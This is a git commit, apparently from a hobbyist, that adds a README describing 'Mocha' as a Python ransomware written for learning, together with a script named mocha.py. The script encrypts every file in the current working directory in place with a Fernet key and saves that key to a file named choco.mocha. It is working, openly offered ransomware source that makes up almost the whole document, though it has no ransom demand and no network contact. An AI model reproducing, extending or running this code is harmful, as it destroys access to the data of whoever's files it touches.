2434fb3b9b42f3c33be75979355b7ad8425b7b57
Robatortas <robatortas1@gmail.com>
2022-08-03 21:46:55 -0700

    Initial Commit

---
+++ README.txt
@@ -0,0 +1,6 @@
+# Mocha
+
+A ransomware, build with python.
+
+This project is basically me just learning proper python.
+Nothing fancy nor anything but I will keep adding some stuff here!
---
+++ mocha.py
@@ -0,0 +1,32 @@
+import os
+
+from cryptography.fernet import Fernet
+# key
+# file = open("choco.mocha", "x")
+
+files = []
+
+# cwd stands for Current Working Directory // .listdir()
+for file in os.listdir():
+    if(file == "mocha.py" or file == "choco.mocha"):
+        continue
+    else: files.append(file)
+
+print(files)
+
+# Encryption key!
+key = Fernet.generate_key()
+
+# File containing decryption key
+mocha = open("choco.mocha", "x")
+with open("choco.mocha", "wb") as mochaContent:
+    mochaContent.write(key)
+
+# Write encrypted text to file
+for file in files:
+    with open(file, "rb") as openedFile:
+        # Gets all data from file
+        contents = openedFile.read()
+    encrypt = Fernet(key).encrypt(contents)
+    with open(file, "wb") as writeFile:
+        writeFile.write(encrypt)
